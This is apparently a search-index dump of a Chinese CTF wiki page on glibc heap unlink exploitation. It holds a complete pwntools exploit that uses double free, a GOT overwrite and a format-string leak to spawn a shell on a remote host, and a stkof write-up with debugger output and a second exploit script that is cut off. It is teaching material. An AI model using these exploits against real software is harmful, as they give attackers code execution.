note0\u5c31\u53ef\u4ee5\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\u6570\u636e\u3002\n\n\n\u4f46\u662f\u9898\u76ee\u6ca1\u6709\u63d0\u4f9bshow\u529f\u80fd\uff0c\u6240\u4ee5\u65e0\u6cd5\u8fdb\u884c\u4efb\u610f\u5730\u5740\u8bfb\uff0c\u4e5f\u5c31\u65e0\u6cd5\u6cc4\u6f0f\u6570\u636e\u3002\n\u8fd9\u91cc\u91c7\u7528\u7684\u529e\u6cd5\u662f\u628afree\u7684got\u8868\u6539\u4e3aprintf\u7684\u503c\uff0c\u7136\u540e\u5728bbs\u4e2d\u4e00\u5757\u7a7a\u767d\u7684\u533a\u57df\u5199\u5165\"%x\"\u3002\n\u8fd9\u6837\u5f53free\u8fd9\u5757\u533a\u57df\uff08\u8fd9\u5757\u533a\u57df\u5728ptr_array\u4e2d\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u4f20\u9012\u7ed9free\uff09\uff0c\u5c31\u53ef\u4ee5\u6cc4\u6f0f\u51fa\u6808\u4e2d\u7684\u6570\u636e\u3002\n\u901a\u8fc7\u6808\u4e2d\u7684libc\u5730\u5740\u6c42\u51fasystem\u7684\u5730\u5740\u5c31\u53ef\u4ee5\u5229\u7528\u4efb\u610f\u5730\u5740\u5199\u83b7\u5f97shell\n\n\nfree(4)\n\nedit(3,free_got)\nedit(0,printf_plt)\n\nedit(3,p64(0x6020e8))\nedit(0,\n%llx.\n*30)\n\n\n\u5b8c\u6210\u7684exp\u5982\u4e0b\n\n\n#!/usr/bin/python\n# -*- coding: utf-8 -*-\nfrom pwn import *\nimport time\ndef malloc(size,data):\n    print conn.recvuntil(\n)\n    conn.sendline(\n1\n)\n    print conn.recvuntil(\n1024)\n)\n    conn.sendline(str(size))\n    print conn.recvuntil(\ncontent:\n)\n    conn.sendline(data)\n    print conn.recvuntil(\n\\n\n)\ndef edit(id,data):\n    print conn.recvuntil(\n)\n    conn.sendline(\n3\n)\n    print conn.recvuntil(\nnote:\n)\n    conn.sendline(str(id))\n    print conn.recvuntil(\nent:\n)\n    conn.sendline(data)\n    print conn.recvuntil(\nsuccess\n)\ndef free(id):\n    print conn.recvuntil(\n)\n    conn.sendline(\n4\n)\n    print conn.recvuntil(\nnote:\n)\n    conn.sendline(str(id))\n    print conn.recvuntil(\nsuccess\n)\n\n#conn = remote(\n127.0.0.1\n,9999)\nconn = remote(\n115.28.27.103\n,9003)\nfree_got = p64(0x602018)\nputs_got = p64(0x602020)\nstack_got = p64(0x602038)\nprintf_got = p64(0x602030)\nexit_got = p64(0x602078)\nprintf_plt = p64(0x400750)\nputs_plt = p64(0x400730)\n#libcstartmain_ret_off = 0x21b45\n#sys_off = 0x414f0\nlibcstartmain_ret_off = 0x21ec5\nsys_off = 0x46640\n# 1. int overflow lead to double free\nintoverflow = -9223372036854775808\nmalloc(512,\n/bin/sh\\0\n)\nmalloc(512,\n/bin/sh\\0\n)\nmalloc(512,\n/bin/sh\\0\n)\nmalloc(512,\n/bin/sh\\0\n)\nmalloc(512,\n/bin/sh\\0\n)\nmalloc(512,\n/bin/sh\\0\n)\nmalloc(512,p64(0x400ef8))\nmalloc(512,\n/bin/sh\\0\n)\n# 2. make a fake chunk and modify the next chunk\ns pre size \nfakechunk = p64(0) + p64(512+1) + p64(0x6020e0-0x18) + p64(0x6020e0-0x10) + \nA\n*(512-32) + p64(512) + p64(512+16)\nedit(3,\naaaaaa\n)\nedit(intoverflow,fakechunk)\n# 3. double free\nfree(4)\n# 4. overwrite got\nedit(3,free_got)\nedit(0,printf_plt+printf_plt)\n# 5. leak the stack data\nedit(3,p64(0x6020e8))\nedit(0,\n%llx.\n*30)\n#free-\nputs\nprint conn.recvuntil(\n)\nconn.sendline(\n4\n)\nprint conn.recvuntil(\nnote:\n)\nconn.sendline(str(0))\n#time.sleep(0.3)\nret =  conn.recvuntil(\nsuccess\n)\nprint ret\n# 6. calcuate the system\ns addr\nlibcstart = ret.split(\n.\n)[10]\nlibcstart_2 = int(libcstart,16) - libcstartmain_ret_off\nprint \nlibc start addr:\n,hex(libcstart_2)\nsystem_addr = libcstart_2 + sys_off\nprint \nsystem_addr:\n,hex(system_addr)\n# 7. overwrite free\ns got\nedit(3,free_got)\nedit(0,p64(system_addr)+printf_plt)\n# 8. write argv\nedit(3,p64(0x6020d0))\nedit(0,\n/bin/sh\\0\n)\n# 9. exploit\nprint conn.recvuntil(\n)\nconn.sendline(\n4\n)\nprint conn.recvuntil(\nnote:\n)\nconn.sendline(str(0))\nsleep(0.2)\nconn.interactive()", 
            "title": "Unlink"
        }, 
        {
            "location": "/pwn/heap/unlink/#unlink", 
            "text": "", 
            "title": "Unlink"
        }, 
        {
            "location": "/pwn/heap/unlink/#_1", 
            "text": "\u6211\u4eec\u5728\u5229\u7528 unlink \u6240\u9020\u6210\u7684\u6f0f\u6d1e\u65f6\uff0c\u5176\u5b9e\u5c31\u662f\u5bf9\u8fdb\u884c unlink chunk \u8fdb\u884c\u5185\u5b58\u5e03\u5c40\uff0c\u7136\u540e\u501f\u52a9 unlink \u64cd\u4f5c\u6765\u8fbe\u6210\u4fee\u6539\u6307\u9488\u7684\u6548\u679c\u3002  \u6211\u4eec\u5148\u6765\u7b80\u5355\u56de\u987e\u4e00\u4e0b unlink \u7684\u76ee\u7684\u4e0e\u8fc7\u7a0b\uff0c\u5176\u76ee\u7684\u662f\u628a\u4e00\u4e2a\u53cc\u5411\u94fe\u8868\u4e2d\u7684\u7a7a\u95f2\u5757\u62ff\u51fa\u6765\uff0c\u7136\u540e\u548c\u76ee\u524d\u7269\u7406\u76f8\u90bb\u7684 free chunk \u8fdb\u884c\u5408\u5e76\u3002\u5176\u57fa\u672c\u7684\u8fc7\u7a0b\u5982\u4e0b   \u4e0b\u9762\u6211\u4eec\u9996\u5148\u4ecb\u7ecd\u4e00\u4e0b unlink \u6700\u521d\u6ca1\u6709\u9632\u62a4\u65f6\u7684\u5229\u7528\u65b9\u6cd5\uff0c\u7136\u540e\u4ecb\u7ecd\u76ee\u524d\u5229\u7528 unlink \u7684\u65b9\u5f0f\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/heap/unlink/#unlink_1", 
            "text": "\u5728\u6700\u521d unlink \u5b9e\u73b0\u7684\u65f6\u5019\uff0c\u5176\u5b9e\u662f\u6ca1\u6709\u5bf9\u53cc\u5411\u94fe\u8868\u68c0\u67e5\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u6ca1\u6709\u4ee5\u4e0b\u7684\u4ee3\u7801\u3002  // \u7531\u4e8eP\u5df2\u7ecf\u5728\u53cc\u5411\u94fe\u8868\u4e2d\uff0c\u6240\u4ee5\u6709\u4e24\u4e2a\u5730\u65b9\u8bb0\u5f55\u5176\u5927\u5c0f\uff0c\u6240\u4ee5\u68c0\u67e5\u4e00\u4e0b\u5176\u5927\u5c0f\u662f\u5426\u4e00\u81f4\u3002  if   ( __builtin_expect   ( chunksize ( P )   !=   prev_size   ( next_chunk ( P )),   0 ))       \\\n       malloc_printerr   ( corrupted size vs. prev_size );                \\ // fd bk  if   ( __builtin_expect   ( FD - bk   !=   P   ||   BK - fd   !=   P ,   0 ))                       \\\n   malloc_printerr   ( check_action ,   corrupted double-linked list ,   P ,   AV );   \\\n\n   // next_size related \n               if   ( __builtin_expect   ( P - fd_nextsize - bk_nextsize   !=   P ,   0 )               \\\n                 ||   __builtin_expect   ( P - bk_nextsize - fd_nextsize   !=   P ,   0 ))     \\\n               malloc_printerr   ( check_action ,                                       \\\n                                corrupted double-linked list (not small) ,     \\\n                                P ,   AV );      \u8fd9\u91cc\u6211\u4eec\u4ee5 32 \u4f4d\u4e3a\u4f8b \uff0c\u5047\u8bbe\u5806\u5185\u5b58\u6700\u521d\u7684\u5e03\u5c40\u662f\u4e0b\u9762\u7684\u6837\u5b50   \u90a3\u4e48\u5982\u679c\u6211\u4eec\u901a\u8fc7\u67d0\u79cd\u65b9\u5f0f\uff08 \u6bd4\u5982\u6ea2\u51fa \uff09\u5c06 Nextchunk \u7684 fd \u548c bk \u6307\u9488\u4fee\u6539\u4e3a\u6307\u5b9a\u7684\u503c\u3002\u5219\u5f53\u6211\u4eecfree(Q)\u65f6   glibc \u5224\u65ad\u8fd9\u4e2a\u5757\u662f small chunk\u3002  \u5224\u65ad\u524d\u5411\u5408\u5e76\uff0c\u53d1\u73b0\u524d\u4e00\u4e2a chunk \u5904\u4e8e\u4f7f\u7528\u72b6\u6001\uff0c\u4e0d\u9700\u8981\u524d\u5411\u5408\u5e76\u3002  \u5224\u65ad\u540e\u5411\u5408\u5e76\uff0c\u53d1\u73b0\u540e\u4e00\u4e2a chunk \u5904\u4e8e\u7a7a\u95f2\u72b6\u6001\uff0c\u9700\u8981\u5408\u5e76\u3002  \u7ee7\u800c\u5bf9 nextchunk \u91c7\u53d6 unlink \u64cd\u4f5c\u3002   \u90a3\u4e48 unlink \u5177\u4f53\u6267\u884c\u7684\u6548\u679c\u662f\u4ec0\u4e48\u6837\u5b50\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u6765\u5206\u6790\u4e00\u4e0b   FD=P- fd = target addr -12  BK=P- bk = expect value  FD- bk = BK\uff0c\u5373 *(target addr-12+12)=BK=expect value  BK- fd = FD\uff0c\u5373*(expect value +8) = FD = target addr-12   \u770b\u8d77\u6765\u6211\u4eec\u4f3c\u4e4e\u53ef\u4ee5\u901a\u8fc7 unlink \u76f4\u63a5\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u8bfb\u5199\u7684\u76ee\u7684\uff0c\u4f46\u662f\u6211\u4eec\u8fd8\u662f\u9700\u8981\u786e\u4fdd expect value +8 \u5730\u5740\u5177\u6709\u53ef\u5199\u7684\u6743\u9650\u3002  \u6bd4\u5982\u8bf4\u6211\u4eec\u5c06 target addr \u8bbe\u7f6e\u4e3a\u67d0\u4e2a got \u8868\u9879\uff0c\u90a3\u4e48\u5f53\u7a0b\u5e8f\u8c03\u7528\u5bf9\u5e94\u7684 libc \u51fd\u6570\u65f6\uff0c\u5c31\u4f1a\u76f4\u63a5\u6267\u884c\u6211\u4eec\u8bbe\u7f6e\u7684\u503c\uff08expect value\uff09\u5904\u7684\u4ee3\u7801\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cexpect value+8 \u5904\u7684\u503c\u88ab\u7834\u574f\u4e86\uff0c\u9700\u8981\u60f3\u529e\u6cd5\u7ed5\u8fc7\u3002", 
            "title": "\u53e4\u8001\u7684 unlink"
        }, 
        {
            "location": "/pwn/heap/unlink/#unlink_2", 
            "text": "\u4f46\u662f\uff0c\u73b0\u5b9e\u662f\u6b8b\u9177\u7684\u3002\u3002 \u6211\u4eec\u521a\u624d\u8003\u8651\u7684\u662f\u6ca1\u6709\u68c0\u67e5\u7684\u60c5\u51b5\uff0c\u4f46\u662f\u4e00\u65e6\u52a0\u4e0a\u68c0\u67e5\uff0c\u5c31\u6ca1\u6709\u8fd9\u4e48\u7b80\u5355\u4e86\u3002\u6211\u4eec\u770b\u4e00\u4e0b\u5bf9 fd \u548c bk \u7684\u68c0\u67e5  // fd bk  if   ( __builtin_expect   ( FD - bk   !=   P   ||   BK - fd   !=   P ,   0 ))                       \\\n   malloc_printerr   ( check_action ,   corrupted double-linked list ,   P ,   AV );   \\  \u6b64\u65f6   FD- bk = target addr - 12 + 12=target_addr  BK- fd = expect value + 8   \u90a3\u4e48\u6211\u4eec\u4e0a\u9762\u6240\u5229\u7528\u7684\u4fee\u6539 GOT \u8868\u9879\u7684\u65b9\u6cd5\u5c31\u53ef\u80fd\u4e0d\u53ef\u7528\u4e86\u3002\u4f46\u662f\uff0c\u5982\u679c\u6211\u4eec\u4f7f\u5f97 expect value+8 \u4ee5\u53ca target_addr \u7b49\u4e8e P\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u6267\u884c   *P= expect value = P - 8  *P = target addr -12 = P - 12   \u5373\u6539\u5199\u4e86\u6307\u9488 P \u7684\u5185\u5bb9\uff0c\u5c06\u5176\u6307\u5411\u4e86\u6bd4\u81ea\u5df1\u4f4e 12 \u7684\u5730\u5740\u5904\u3002  \u800c\u5982\u679c\u6211\u4eec\u60f3\u8981\u4f7f\u5f97\u4e24\u8005\u90fd\u6307\u5411 P\uff0c\u53ea\u9700\u8981\u5b89\u88c5\u5982\u4e0b\u65b9\u5f0f\u4fee\u6539\u5373\u53ef   \u6211\u4eec\u4f1a\u901a\u8fc7\u4e4b\u540e\u7684\u4f8b\u5b50\u6765\u8bf4\u660e\uff0c\u6211\u4eec\u8fd9\u6837\u7684\u4fee\u6539\u662f\u53ef\u4ee5\u8fbe\u5230\u4e00\u5b9a\u7684\u6548\u679c\u7684\u3002  \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u6211\u4eec\u5e76\u6ca1\u6709\u8fdd\u80cc\u4e0b\u9762\u7684\u7ea6\u675f\u3002       // \u7531\u4e8eP\u5df2\u7ecf\u5728\u53cc\u5411\u94fe\u8868\u4e2d\uff0c\u6240\u4ee5\u6709\u4e24\u4e2a\u5730\u65b9\u8bb0\u5f55\u5176\u5927\u5c0f\uff0c\u6240\u4ee5\u68c0\u67e5\u4e00\u4e0b\u5176\u5927\u5c0f\u662f\u5426\u4e00\u81f4\u3002 \n     if   ( __builtin_expect   ( chunksize ( P )   !=   prev_size   ( next_chunk ( P )),   0 ))       \\\n       malloc_printerr   ( corrupted size vs. prev_size );                \\  \u6b64\u5916\uff0c\u5176\u5b9e\u5982\u679c\u6211\u4eec\u8bbe\u7f6enext chunk \u7684 fd \u548c bk \u5747\u4e3a nextchunk \u7684\u5730\u5740\u4e5f\u662f\u53ef\u4ee5\u7ed5\u8fc7\u4e0a\u9762\u7684\u68c0\u6d4b\u7684\u3002\u4f46\u662f\u8fd9\u6837\u7684\u8bdd\uff0c\u5e76\u4e0d\u80fd\u8fbe\u5230\u4fee\u6539\u6307\u9488\u5185\u5bb9\u7684\u6548\u679c\u3002", 
            "title": "\u5f53\u524d\u7684 unlink"
        }, 
        {
            "location": "/pwn/heap/unlink/#2014-hitcon-stkof", 
            "text": "", 
            "title": "2014 HITCON stkof"
        }, 
        {
            "location": "/pwn/heap/unlink/#_2", 
            "text": "\u279c  2014_hitcon_stkof git: ( master )  file stkof   \nstkof: ELF  64 -bit LSB executable, x86-64, version  1   ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,  for  GNU/Linux  2 .6.32, BuildID [ sha1 ]= 4872b087443d1e52ce720d0a4007b1920f18e7b0, stripped\n\u279c  2014_hitcon_stkof git: ( master )  checksec stkof         [ * ]   /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unlink/2014_hitcon_stkof/stkof \n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x400000 )   \u53ef\u4ee5\u770b\u51fa\uff0c\u7a0b\u5e8f\u662f 64 \u4f4d\u7684\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 Canary \u548c NX \u4fdd\u62a4\u3002", 
            "title": "\u57fa\u672c\u4fe1\u606f"
        }, 
        {
            "location": "/pwn/heap/unlink/#_3", 
            "text": "\u7a0b\u5e8f\u51e0\u4e4e\u5565\u8f93\u51fa\u4e5f\u6ca1\u6709\uff0c\u53ea\u80fd\u786c\u770b\u4e86\uff0c\u5927\u6982\u662f\u4e00\u4e2a\u5185\u5b58\u5206\u914d\u5668\uff0c\u5dee\u4e0d\u591a\u6709\u56db\u4e2a\u529f\u80fd   1\uff0c\u5206\u914d\u6307\u5b9a\u5927\u5c0f\u7684\u5185\u5b58\uff0c\u5e76\u5728bss\u6bb5\u8bb0\u5f55\u5bf9\u5e94 chunk \u7684\u6307\u9488\uff0c\u5047\u8bbe\u5176\u4e3aglobal\u3002  2\uff0c\u6839\u636e\u6307\u5b9a\u7d22\u5f15\uff0c\u4ee5\u53ca\u6307\u5b9a\u5927\u5c0f\u5411\u6307\u5b9a\u5185\u5b58\u5904\uff0c\u8bfb\u5165\u6570\u636e\u3002 \u53ef\u89c1\uff0c\u8fd9\u91cc\u5b58\u5728\u5806\u6ea2\u51fa\u7684\u60c5\u51b5\uff0c\u56e0\u4e3a\u8fd9\u91cc\u8bfb\u5165\u5b57\u8282\u7684\u5927\u5c0f\u662f\u7531\u6211\u4eec\u6765\u63a7\u5236\u7684\u3002  3\uff0c\u6839\u636e\u6307\u5b9a\u7d22\u5f15\uff0c\u91ca\u653e\u5df2\u7ecf\u5206\u914d\u7684\u5185\u5b58\u5757\u3002  4\uff0c\u8fd9\u4e2a\u529f\u80fd\u5e76\u6ca1\u6709\u4ec0\u4e48\u4e71\u7528\uff0c\u672c\u6765\u4ee5\u4e3a\u662f\u53ef\u4ee5\u8f93\u51fa\u5185\u5bb9\uff0c\u7ed3\u679c\u4ec0\u4e48\u4e5f\u6ca1\u6709\u8f93\u51fa\u3002\u3002", 
            "title": "\u57fa\u672c\u529f\u80fd"
        }, 
        {
            "location": "/pwn/heap/unlink/#_4", 
            "text": "\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u7531\u4e8e\u7a0b\u5e8f\u672c\u8eab\u6ca1\u6709\u8fdb\u884c setbuf \u64cd\u4f5c\uff0c\u6240\u4ee5\u5728\u6267\u884c\u8f93\u5165\u8f93\u51fa\u64cd\u4f5c\u7684\u65f6\u5019\u4f1a\u7533\u8bf7\u7f13\u51b2\u533a\u3002\u8fd9\u91cc\u7ecf\u8fc7\u6d4b\u8bd5\uff0c\u4f1a\u7533\u8bf7\u4e24\u4e2a\u7f13\u51b2\u533a\uff0c\u5206\u522b\u5927\u5c0f\u4e3a1024 \u548c 1024\u3002\u5177\u4f53\u5982\u4e0b\uff0c\u53ef\u4ee5\u8fdb\u884c\u8c03\u8bd5\u67e5\u770b  \u521d\u6b21\u8c03\u7528 fgets \u65f6\uff0cmalloc\u4f1a\u5206\u914d\u7f13\u51b2\u533a 1024 \u5927\u5c0f\u3002  *RAX  0x0\n*RBX  0x400\n*RCX  0x7ffff7b03c34 (__fxstat64+20) \u25c2\u2014 cmp    rax, -0x1000 /*  H=  */\n*RDX  0x88\n*RDI  0x400\n*RSI  0x7fffffffd860 \u25c2\u2014 0x16\n*R8   0x1\n*R9   0x0\n*R10  0x7ffff7fd2700 \u25c2\u2014 0x7ffff7fd2700\n*R11  0x246\n*R12  0xa\n*R13  0x9\n R14  0x0\n*R15  0x7ffff7dd18e0 (_IO_2_1_stdin_) \u25c2\u2014 0xfbad2288\n*RBP  0x7ffff7dd18e0 (_IO_2_1_stdin_) \u25c2\u2014 0xfbad2288\n*RSP  0x7fffffffd858 \u2014\u25b8 0x7ffff7a7a1d5 (_IO_file_doallocate+85) \u25c2\u2014 mov    rsi, rax\n*RIP  0x7ffff7a91130 (malloc) \u25c2\u2014 push   rbp\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ DISASM ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \u25ba 0x7ffff7a91130  malloc         push   rbp  0x7ffff7dd18e0 \n...\uff0c\u7701\u7565\n \u25ba f 0     7ffff7a91130 malloc\n   f 1     7ffff7a7a1d5 _IO_file_doallocate+85\n   f 2     7ffff7a88594 _IO_doallocbuf+52\n   f 3     7ffff7a8769c _IO_file_underflow+508\n   f 4     7ffff7a8860e _IO_default_uflow+14\n   f 5     7ffff7a7bc6a _IO_getline_info+170\n   f 6     7ffff7a7bd78\n   f 7     7ffff7a7ab7d fgets+173\n   f 8           400d2e\n   f 9     7ffff7a2d830 __libc_start_main+240  \u5206\u914d\u4e4b\u540e\uff0c\u5806\u5982\u4e0b  pwndbg  heap\nTop Chunk: 0xe05410\nLast Remainder: 0\n\n0xe05000 PREV_INUSE {\n  prev_size = 0, \n  size = 1041, \n  fd = 0x0, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x0\n}\n0xe05410 PREV_INUSE {\n  prev_size = 0, \n  size = 134129, \n  fd = 0x0, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x0\n}  \u5f53\u5206\u914d16\u5927\u5c0f\u7684\u5185\u5b58\u540e\uff0c\u5806\u5e03\u5c40\u5982\u4e0b  pwndbg  heap\nTop Chunk: 0xe05430\nLast Remainder: 0\n\n0xe05000 PREV_INUSE {\n  prev_size = 0, \n  size = 1041, \n  fd = 0xa3631, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x0\n}\n0xe05410 FASTBIN {\n  prev_size = 0, \n  size = 33, \n  fd = 0x0, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x20bd1\n}\n0xe05430 PREV_INUSE {\n  prev_size = 0, \n  size = 134097, \n  fd = 0x0, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x0\n}  \u5f53\u4f7f\u7528 printf \u51fd\u6570\uff0c\u4f1a\u5206\u914d 1024 \u5b57\u8282\u7a7a\u95f4\uff0c\u5982\u4e0b  *RAX  0x0\n*RBX  0x400\n*RCX  0x7ffff7b03c34 (__fxstat64+20) \u25c2\u2014 cmp    rax, -0x1000 /*  H=  */\n*RDX  0x88\n*RDI  0x400\n*RSI  0x7fffffffd1c0 \u25c2\u2014 0x16\n R8   0x0\n*R9   0x0\n*R10  0x0\n*R11  0x246\n*R12  0x1\n*R13  0x7fffffffd827 \u25c2\u2014 0x31 /*  1  */\n R14  0x0\n*R15  0x400de4 \u25c2\u2014 and    eax, 0x2e000a64 /*  %d\\n  */\n*RBP  0x7ffff7dd2620 (_IO_2_1_stdout_) \u25c2\u2014 0xfbad2284\n*RSP  0x7fffffffd1b8 \u2014\u25b8 0x7ffff7a7a1d5 (_IO_file_doallocate+85) \u25c2\u2014 mov    rsi, rax\n*RIP  0x7ffff7a91130 (malloc) \u25c2\u2014 push   rbp\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ DISASM ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \u25ba 0x7ffff7a91130  malloc        push   rbp  0x7ffff7dd2620 \n\u3002\u3002\u3002\u7701\u7565\n\u25ba f 0     7ffff7a91130 malloc\n   f 1     7ffff7a7a1d5 _IO_file_doallocate+85\n   f 2     7ffff7a88594 _IO_doallocbuf+52\n   f 3     7ffff7a878f8 _IO_file_overflow+456\n   f 4     7ffff7a8628d _IO_file_xsputn+173\n   f 5     7ffff7a5ae00 vfprintf+3216\n   f 6     7ffff7a62899 printf+153\n   f 7           4009cd\n   f 8           400cb1\n   f 9     7ffff7a2d830 __libc_start_main+240  \u5806\u5e03\u5c40\u5982\u4e0b  pwndbg  heap\nTop Chunk: 0xe05840\nLast Remainder: 0\n\n0xe05000 PREV_INUSE {\n  prev_size = 0, \n  size = 1041, \n  fd = 0xa3631, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x0\n}\n0xe05410 FASTBIN {\n  prev_size = 0, \n  size = 33, \n  fd = 0x0, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x411\n}\n0xe05430 PREV_INUSE {\n  prev_size = 0, \n  size = 1041, \n  fd = 0xa4b4f, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x0\n}\n0xe05840 PREV_INUSE {\n  prev_size = 0, \n  size = 133057, \n  fd = 0x0, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x0\n}  \u6b64\u540e\uff0c\u65e0\u8bba\u662f\u8f93\u5165\u8f93\u51fa\u90fd\u4e0d\u4f1a\u518d\u7533\u8bf7\u7f13\u51b2\u53bb\u4e86\u3002\u6240\u4ee5\u6211\u4eec\u6700\u597d\u6700\u521d\u7684\u7533\u8bf7\u4e00\u4e2a chunk \u6765\u628a\u8fd9\u4e9b\u7f13\u51b2\u533a\u7ed9\u7533\u8bf7\u4e86\uff0c\u65b9\u4fbf\u4e4b\u540e\u64cd\u4f5c\u3002  \u4f46\u662f\uff0c\u6bd4\u8f83\u6709\u610f\u601d\u7684\u662f\uff0c\u5982\u679c\u6211\u4eec\u662f attach \u4e0a\u53bb\u7684\u8bdd\uff0c\u7b2c\u4e00\u4e2a\u7f13\u51b2\u533a\u5206\u914d\u7684\u5927\u5c0f\u4e3a 4096 \u5927\u5c0f\u3002  pwndbg  heap\nTop Chunk: 0x1e9b010\nLast Remainder: 0\n\n0x1e9a000 PREV_INUSE {\n  prev_size = 0, \n  size = 4113, \n  fd = 0x0, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x0\n}\n0x1e9b010 PREV_INUSE {\n  prev_size = 0, \n  size = 135153, \n  fd = 0x0, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x0\n}", 
            "title": "\u521d\u6b65\u6d4b\u8bd5"
        }, 
        {
            "location": "/pwn/heap/unlink/#_5", 
            "text": "\u6839\u636e\u4e0a\u9762\u5206\u6790\uff0c\u6211\u4eec\u5728\u524d\u9762\u5148\u5206\u914d\u4e00\u4e2a chunk \u6765\u628a\u7f13\u51b2\u533a\u5206\u914d\u5b8c\u6bd5\uff0c\u4ee5\u514d\u5f71\u54cd\u4e4b\u540e\u7684\u64cd\u4f5c\u3002  \u7531\u4e8e\u7a0b\u5e8f\u672c\u8eab\u6ca1\u6709 leak\uff0c\u8981\u60f3\u6267\u884c system \u7b49\u51fd\u6570\uff0c\u6211\u4eec\u7684\u9996\u8981\u76ee\u7684\u8fd8\u662f\u5148\u6784\u9020 leak\uff0c\u57fa\u672c\u601d\u8def\u5982\u4e0b   \u5229\u7528 unlink \u4fee\u6539 global[2] \u4e3a  global[2]-0x18\u3002  \u5229\u7528\u7f16\u8f91\u529f\u80fd\u4fee\u6539 global[0] \u4e3a free@got \u5730\u5740\uff0c\u540c\u65f6\u4fee\u6539 global[1] \u4e3aputs@got \u5730\u5740\uff0cglobal[2] \u4e3a atoi@got \u5730\u5740\u3002  \u4fee\u6539  free@got  \u4e3a  puts@plt  \u7684\u5730\u5740\uff0c\u4ece\u800c\u5f53\u518d\u6b21\u8c03\u7528  free  \u51fd\u6570\u65f6\uff0c\u5373\u53ef\u76f4\u63a5\u8c03\u7528 puts \u51fd\u6570\u3002\u8fd9\u6837\u5c31\u53ef\u4ee5\u6cc4\u6f0f\u51fd\u6570\u5185\u5bb9\u3002   free global[2]\uff0c\u5373\u6cc4\u6f0f puts@got \u5185\u5bb9\uff0c\u4ece\u800c\u77e5\u9053 system \u51fd\u6570\u5730\u5740\u4ee5\u53ca libc \u4e2d /bin/sh \u5730\u5740\u3002  \u4fee\u6539  atoi@got  \u4e3a system \u51fd\u6570\u5730\u5740\uff0c\u518d\u6b21\u8c03\u7528\u65f6\uff0c\u8f93\u5165 /bin/sh \u5730\u5740\u5373\u53ef\u3002   \u4ee3\u7801\u5982\u4e0b  context . terminal   =   [ gnome-terminal ,   -x ,   sh ,   -c ]  if   args [ DEBUG ]: \n     context . log_level   =   debug  context . binary   =   ./stkof  stkof   =   ELF ( ./stkof )  if   args [ REMOTE ]: \n     p   =   remote ( 127.0.0.1 ,   7777 )  else : \n     p   =   process ( ./stkof )  log . info ( PID:    +   str ( proc . pidof ( p )[ 0 ]))  libc   =   ELF ( ./libc.so.6 )  head   =   0x602140  def   alloc ( size ): \n     p . sendline ( 1 ) \n     p . sendline ( str ( size )) \n     p . recvuntil ( OK \\n )  def   edit ( idx ,   size ,   content ): \n     p . sendline ( 2 ) \n     p . sendline ( str ( idx )) \n     p . sendline ( str ( size )) \n     p . send ( content ) \n     p . recvuntil ( OK \\n )  def   free ( idx ): \n     p . sendline ( 3 ) \n     p . sendline ( str ( idx ))  def   exp (): \n     # trigger to malloc buffer for io function \n     alloc ( 0x100 )    # idx 1 \n     # begin  \n     alloc ( 0x30 )    # idx 2 \n     # small chunk size 